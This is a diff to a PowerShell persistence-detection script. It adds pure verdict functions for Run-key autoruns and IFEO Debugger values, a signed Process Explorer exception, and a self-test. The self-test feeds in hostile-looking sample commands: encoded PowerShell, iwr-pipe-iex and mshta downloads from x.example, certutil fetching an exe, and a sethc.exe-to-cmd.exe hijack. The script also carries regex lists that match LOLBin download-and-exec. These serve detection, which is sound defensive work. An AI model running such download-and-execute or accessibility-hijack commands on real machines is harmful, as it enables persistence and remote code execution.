@@ -29,7 +29,14 @@
 #                   binary). Section 13 escalates the accessibility binaries
 #                   to CRITICAL separately; here every IFEO Debugger, on any
 #                   binary, is surfaced as a WARNING so non-accessibility
-#                   targets (e.g. notepad.exe) are no longer silent.
+#                   targets (e.g. notepad.exe) are no longer silent -- with ONE
+#                   documented exception: Process Explorer's "Replace Task
+#                   Manager" option (Sysinternals, Options menu) is implemented
+#                   as exactly this value on taskmgr.exe. When the debugger is a
+#                   validly Microsoft-signed procexp binary that is context,
+#                   not a finding; an unsigned file called procexp64.exe on the
+#                   same key is still the hijack. Get-IfeoVerdict holds the
+#                   rule and -SelfTest pins both sides.
 #
 # A finding writes -MarkerFile so the caller raises the exit code / findings
 # count. CRITICAL is intentionally not emitted here (these are high-but-not-
@@ -40,7 +47,8 @@
 
 [CmdletBinding()]
 param(
-    [string]$MarkerFile
+    [string]$MarkerFile,
+    [switch]$SelfTest
 )
 
 $ErrorActionPreference = 'Continue'
@@ -138,17 +146,7 @@ function Get-WhenLine {
 # the registry timestamp is the signal there).
 function Get-AutorunBinary {
     param([string]$Command)
-    if (-not $Command) { return '' }
-    $c = $Command.Trim()
-    $path = ''
-    if ($c.StartsWith('"')) {
-        $end = $c.IndexOf('"', 1)
-        if ($end -gt 1) { $path = $c.Substring(1, $end - 1) }
-    } else {
-        $m = [regex]::Match($c, '^([^\s]+\.(?:exe|dll|scr|bat|cmd|ps1|vbs|js|com))\b')
-        if ($m.Success) { $path = $m.Groups[1].Value }
-        else { $path = ($c -split '\s+')[0] }
-    }
+    $path = Get-CommandPath $Command
     if (-not $path) { return '' }
     try { $path = [Environment]::ExpandEnvironmentVariables($path) } catch {}
     if (Test-Path -LiteralPath $path -PathType Leaf) { return $path }
@@ -171,7 +169,7 @@ $psNoteProps = @('PSPath', 'PSParentPath', 'PSChildName', 'PSDrive', 'PSProvider
 
 # STRONG command-content indicators -- fire on their own (unambiguous):
 # encoded PowerShell, base64 decode, and LOLBin download-and-exec.
-$strongContent = @(
+$script:StrongContent = @(
     '-enc(odedcommand)?\b',
     '-e\s+[A-Za-z0-9+/=]{24,}',
     'frombase64string',
@@ -184,14 +182,144 @@ $strongContent = @(
 )
 # A hidden-window launcher (-w hidden) ALONE is common in legitimate updaters,
 # so flag it only when it co-occurs with a download/encode indicator.
-$hiddenLauncher = '-w(indowstyle)?\s+hidden'
-$hiddenCombine  = @('-enc', 'frombase64', 'downloadstring', 'downloadfile',
-                    'https?:', '(iex|invoke-expression)\b', '-e\s+[A-Za-z0-9+/=]{24,}')
+$script:HiddenLauncher = '-w(indowstyle)?\s+hidden'
+$script:HiddenCombine  = @('-enc', 'frombase64', 'downloadstring', 'downloadfile',
+                           'https?:', '(iex|invoke-expression)\b', '-e\s+[A-Za-z0-9+/=]{24,}')
 # Unusual autorun LOCATIONS (path-only signal; kept narrow to avoid FPs).
 # Anchored to \Users\Public\ on purpose: a bare \Public\ matched any directory
 # named public, e.g. a Node native addon under node_modules\...\public\ in
 # Program Files (field false positive 2026-09-20, CRITICAL, exit code 8).
-$suspPath = @('\\Temp\\', '\\Downloads\\', '\\Users\\Public\\')
+$script:SuspPath = @('\\Temp\\', '\\Downloads\\', '\\Users\\Public\\')
+
+# ---------------------------------------------------------------------------
+# PURE VERDICTS. Plain strings in, a reason (or nothing) out: no registry, no
+# disk, no signature check. The judgement lives here so it can be pinned
+# against the real autoruns of a real machine.
+# ---------------------------------------------------------------------------
+
+# The executable named by a command line, WITHOUT touching the disk: a quoted
+# path, or the first token. Used by the IFEO rule (which needs the file name)
+# and by Get-AutorunBinary (which then checks the disk).
+function Get-CommandPath {
+    param([string]$Command)
+    if (-not $Command) { return '' }
+    $c = $Command.Trim()
+    if ($c.StartsWith('"')) {
+        $end = $c.IndexOf('"', 1)
+        if ($end -gt 1) { return $c.Substring(1, $end - 1) }
+        return ''
+    }
+    $m = [regex]::Match($c, '^([^\s]+\.(?:exe|dll|scr|bat|cmd|ps1|vbs|js|com))\b', 'IgnoreCase')
+    if ($m.Success) { return $m.Groups[1].Value }
+    return ($c -split '\s+')[0]
+}
+
+# A Run/RunOnce value: the reason it is suspicious, or $null when it is not.
+# Three tiers, strongest first: command CONTENT (fires alone), a hidden-window
+# launcher combined with a download/encode indicator, then an unusual PATH.
+function Get-AutorunVerdict {
+    param([string]$Key, [string]$Name, [string]$Value)
+    if (-not $Value) { return $null }
+    foreach ($s in $script:StrongContent) { if ($Value -match $s) { return "command content ($s)" } }
+    if ($Value -match $script:HiddenLauncher) {
+        foreach ($s in $script:HiddenCombine) { if ($Value -match $s) { return "hidden-window launcher + $s" } }
+    }
+    foreach ($s in $script:SuspPath) { if ($Value -match $s) { return "unusual autorun path ($s)" } }
+    return $null
+}
+
+# An IFEO Debugger value. Every one is a hijack EXCEPT the one Sysinternals
+# documents: Process Explorer > Options > Replace Task Manager writes
+#   IFEO\taskmgr.exe\Debugger = "<path>\procexp64.exe"
+# (https://learn.microsoft.com/sysinternals/downloads/process-explorer). That
+# is context when -- and only when -- the debugger binary is validly signed by
+# Microsoft (Sysinternals ships Microsoft-signed). The NAME is not the
+# evidence: an unsigned file called procexp64.exe on that key is the hijack.
+function Get-IfeoVerdict {
+    param([string]$Target, [string]$Debugger, [bool]$DebuggerSigned, [string]$DebuggerSigner = '')
+    $exe = Split-Path -Leaf (Get-CommandPath $Debugger)
+    if ($Target -ieq 'taskmgr.exe' -and $exe -imatch '^procexp(64)?(a)?\.exe$' -and $DebuggerSigned -and $DebuggerSigner -match '\bMicrosoft\b') {
+        return @{ Sev = 'OK'; Line = "[INFO] IFEO Debugger on taskmgr.exe is Process Explorer's 'Replace Task Manager' option (validly Microsoft-signed): $Debugger. Context, not a finding -- Sysinternals writes exactly this value." }
+    }
+    return @{ Sev = 'WARNING'; Line = "[WARNING] IFEO Debugger hijack: $Target => $Debugger" }
+}
+
+if ($SelfTest) {
+    $fails = 0
+    function T { param([string]$Name, [bool]$Ok, [string]$Got)
+        if ($Ok) { Write-Output "[OK]   $Name" } else { Write-Output "[FAIL] $Name$(if($Got){": $Got"})"; $script:fails++ }
+    }
+    $hkcu = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
+    $hklm = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
+    # The owner's real autoruns, pinned VERBATIM from
+    # SecurityReport_20260920_185017 (Section 5 reg query dump). Every one is
+    # ordinary software and every one must grade $null.
+    $benign = @(
+        @($hkcu, 'OneDrive', '"C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background'),
+        @($hkcu, 'BraveSoftware Update', '"C:\Users\khali\AppData\Local\BraveSoftware\Update\1.3.361.151\BraveUpdateCore.exe"'),
+        @($hkcu, 'org.whispersystems.signal-desktop', 'C:\Users\khali\AppData\Local\Programs\signal-desktop\Signal.exe --start-in-tray'),
+        @($hkcu, 'Adobe Acrobat Synchronizer', '"C:\Program Files\Adobe\Acrobat DC\Acrobat\AdobeCollabSync.exe"'),
+        @($hkcu, 'Proton Drive', '"C:\Users\khali\AppData\Local\Programs\Proton\Drive\ProtonDrive.exe" -quiet'),
+        @($hkcu, 'MicrosoftEdgeAutoLaunch_5B486EA56FC3A190C4F0BB45771E329D', '"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --no-startup-window --win-session-start'),
+        @($hkcu, 'Docker Desktop', 'C:\Users\khali\AppData\Local\Programs\DockerDesktop\Docker Desktop.exe'),
+        @($hkcu, 'MicrosoftCopilotAutoLaunch_F6FB03BD129D17F0D98665BA91661954', '"C:\Program Files (x86)\Microsoft\Copilot\Application\mscopilot.exe" --no-startup-window --win-session-start'),
+        @($hklm, 'SecurityHealth', '%windir%\system32\SecurityHealthSystray.exe'),
+        @($hklm, 'RtkAudUService', '"C:\WINDOWS\System32\DriverStore\FileRepository\realtekservice.inf_amd64_d4e2f40b8460b254\RtkAudUService64.exe" -background'),
+        @($hklm, 'WavesSvc', '"C:\WINDOWS\System32\DriverStore\FileRepository\wavesapo12de.inf_amd64_7705ab85ca3fc744\WavesSvc64.exe" -Jack'),
+        @($hklm, 'deviceTRUST Client User', '""'),
+        @($hklm, 'RTKUGUI', '"C:\WINDOWS\system32\RtkUGui64.exe" -s'),
+        @($hklm, 'Logi Download Assistant', '"C:\Program Files\LogiDownloadAssistant\bin\logi_download_assistant.exe" -system-restarted'),
+        @('HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce', 'msedge_cleanup_{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}', '"C:\Program Files (x86)\Microsoft\EdgeWebView\Application\153.0.4234.48\Installer\setup.exe" --msedgewebview --delete-old-versions --system-level --verbose-logging')
+    )
+    foreach ($b in $benign) {
+        $why = Get-AutorunVerdict -Key $b[0] -Name $b[1] -Value $b[2]
+        T ("owner's real autorun is not a finding: " + $b[1]) ($null -eq $why) ("why=" + $why)
+    }
+    T 'a hidden-window launcher ALONE is common in updaters and is not a finding' ($null -eq (Get-AutorunVerdict -Key $hkcu -Name 'Upd' -Value 'powershell.exe -WindowStyle Hidden -File "C:\Program Files\Vendor\update.ps1"')) ''
+    T 'an AppData path alone is not a finding (Slack, Discord, Teams live there)' ($null -eq (Get-AutorunVerdict -Key $hkcu -Name 'X' -Value 'C:\Users\u\AppData\Local\Vendor\app.exe --minimized')) ''
+    T 'a ProgramData path alone is not a finding' ($null -eq (Get-AutorunVerdict -Key $hklm -Name 'X' -Value '"C:\ProgramData\Vendor\agent.exe" /tray')) ''
+    T 'an empty value is not a finding' ($null -eq (Get-AutorunVerdict -Key $hklm -Name 'X' -Value '')) ''
+
+    $why = Get-AutorunVerdict -Key $hkcu -Name 'Updater' -Value 'powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA'
+    T 'hidden window + -enc is a finding' ($why -match 'command content') ("why=" + $why)
+    $why = Get-AutorunVerdict -Key $hkcu -Name 'Updater' -Value 'powershell.exe -w hidden -c "iwr http://x.example/p.ps1 | iex"'
+    T 'hidden window + a download is a finding' ($null -ne $why) ("why=" + $why)
+    $why = Get-AutorunVerdict -Key $hkcu -Name 'Updater' -Value 'powershell -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAA=='
+    T '-e followed by a base64 blob is a finding' ($why -match 'command content') ("why=" + $why)
+    $why = Get-AutorunVerdict -Key $hkcu -Name 'Updater' -Value 'mshta http://x.example/a.hta'
+    T 'mshta from a URL is a finding' ($why -match 'command content') ("why=" + $why)
+    $why = Get-AutorunVerdict -Key $hkcu -Name 'Updater' -Value 'certutil -urlcache -split -f http://x.example/a.exe a.exe'
+    T 'certutil -urlcache is a finding' ($why -match 'command content') ("why=" + $why)
+    $why = Get-AutorunVerdict -Key $hkcu -Name 'Updater' -Value 'C:\Users\u\Downloads\setup_helper.exe'
+    T 'an autorun from Downloads is a finding on path alone' ($why -match 'unusual autorun path') ("why=" + $why)
+    $why = Get-AutorunVerdict -Key $hkcu -Name 'Updater' -Value '"C:\Users\Public\svc.exe" -q'
+    T 'an autorun from Users\Public is a finding' ($why -match 'unusual autorun path') ("why=" + $why)
+    $why = Get-AutorunVerdict -Key $hkcu -Name 'Updater' -Value 'C:\Users\u\AppData\Local\Temp\upd.exe'
+    T 'an autorun from Temp is a finding' ($why -match 'unusual autorun path') ("why=" + $why)
+    $why = Get-AutorunVerdict -Key $hklm -Name 'X' -Value 'C:\Program Files\Vendor\public\helper.exe'
+    T 'a vendor directory named public is NOT a staging path (the #214 regex)' ($null -eq $why) ("why=" + $why)
+
+    # IFEO: the documented benign twin and its impostor.
+    $v = Get-IfeoVerdict -Target 'taskmgr.exe' -Debugger '"C:\Tools\SysinternalsSuite\procexp64.exe"' -DebuggerSigned $true -DebuggerSigner 'CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US'
+    T 'IFEO taskmgr.exe -> Microsoft-signed procexp64.exe is Replace Task Manager: INFO, no finding' ($v.Sev -eq 'OK' -and $v.Line -match "^\[INFO\] .*Replace Task Manager") $v.Line
+    $v = Get-IfeoVerdict -Target 'taskmgr.exe' -Debugger 'C:\Tools\procexp.exe' -DebuggerSigned $true -DebuggerSigner 'CN=Microsoft Corporation'
+    T 'the 32-bit procexp.exe name is covered too' ($v.Sev -eq 'OK') $v.Line
+    $v = Get-IfeoVerdict -Target 'taskmgr.exe' -Debugger 'C:\Users\Public\procexp64.exe' -DebuggerSigned $false -DebuggerSigner ''
+    T 'an UNSIGNED procexp64.exe on taskmgr.exe is the hijack (the name is not the evidence)' ($v.Sev -eq 'WARNING' -and $v.Line -match '^\[WARNING\] IFEO Debugger hijack: taskmgr\.exe') $v.Line
+    $v = Get-IfeoVerdict -Target 'taskmgr.exe' -Debugger 'C:\Tools\procexp64.exe' -DebuggerSigned $true -DebuggerSigner 'CN=Some Other Publisher'
+    T 'a procexp64.exe signed by someone other than Microsoft is the hijack' ($v.Sev -eq 'WARNING') $v.Line
+    $v = Get-IfeoVerdict -Target 'notepad.exe' -Debugger 'C:\Tools\procexp64.exe' -DebuggerSigned $true -DebuggerSigner 'CN=Microsoft Corporation'
+    T 'signed procexp on any target OTHER than taskmgr.exe is still a hijack' ($v.Sev -eq 'WARNING') $v.Line
+    $v = Get-IfeoVerdict -Target 'sethc.exe' -Debugger 'C:\Windows\System32\cmd.exe' -DebuggerSigned $true -DebuggerSigner 'CN=Microsoft Windows'
+    T 'sethc.exe -> cmd.exe is the classic hijack even though cmd.exe is Microsoft-signed' ($v.Sev -eq 'WARNING') $v.Line
+    $v = Get-IfeoVerdict -Target 'notepad.exe' -Debugger 'C:\Users\Public\d.exe' -DebuggerSigned $false
+    T 'a non-accessibility target with an unsigned debugger is a WARNING' ($v.Sev -eq 'WARNING') $v.Line
+    T 'Get-CommandPath strips quotes and arguments' ((Get-CommandPath '"C:\Program Files\X\y.exe" --flag') -eq 'C:\Program Files\X\y.exe' -and (Get-CommandPath 'C:\T\z.exe -a') -eq 'C:\T\z.exe') ''
+
+    if ($fails) { Write-Output "[FAIL] $fails persistence_eval self-test expectation(s) unmet"; exit 1 }
+    Write-Output "[OK] persistence_eval self-test: the owner's $($benign.Count) real autoruns are not findings, encoded/downloading/staged ones are, and Process Explorer's Replace Task Manager is context while an unsigned impostor is the hijack."
+    exit 0
+}
 
 $runKeys = @(
     'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
@@ -223,13 +351,7 @@ foreach ($k in $runKeys) {
         $val = [string]$p.Value
         if (-not $val) { continue }
 
-        $why = $null
-        foreach ($s in $strongContent) { if ($val -match $s) { $why = "command content ($s)"; break } }
-        if (-not $why -and $val -match $hiddenLauncher) {
-            foreach ($s in $hiddenCombine) { if ($val -match $s) { $why = "hidden-window launcher + $s"; break } }
-        }
-        if (-not $why) { foreach ($s in $suspPath) { if ($val -match $s) { $why = "unusual autorun path ($s)"; break } } }
-
+        $why = Get-AutorunVerdict -Key $k -Name $p.Name -Value $val
         if ($why) {
             $found = $true
             # Value NAME on the [WARNING] line so it is greppable per-entry.
@@ -252,11 +374,23 @@ if (-not $ifeoOk) {
     foreach ($sub in $subs) {
         $d = Get-ItemProperty -Path $sub.PSPath -Name Debugger -EA SilentlyContinue
         if ($d -and $d.Debugger) {
-            $found = $true
-            "[WARNING] IFEO Debugger hijack: $($sub.PSChildName) => $($d.Debugger)"
-            Write-WhenCaveat
-            $w = Get-WhenLine -KeyPath $sub.PSPath -FilePath (Get-AutorunBinary ([string]$d.Debugger))
-            if ($w) { $w }
+            $dbg = [string]$d.Debugger
+            $bin = Get-AutorunBinary $dbg
+            $signed = $false; $signer = ''
+            if ($bin) {
+                try {
+                    $sig = Get-AuthenticodeSignature -FilePath $bin -EA Stop
+                    if ($sig -and $sig.Status -eq 'Valid') { $signed = $true; $signer = [string]$sig.SignerCertificate.Subject }
+                } catch {}
+            }
+            $v = Get-IfeoVerdict -Target $sub.PSChildName -Debugger $dbg -DebuggerSigned $signed -DebuggerSigner $signer
+            $v.Line
+            if ($v.Sev -eq 'WARNING') {
+                $found = $true
+                Write-WhenCaveat
+                $w = Get-WhenLine -KeyPath $sub.PSPath -FilePath $bin
+                if ($w) { $w }
+            }
         }
     }
 }
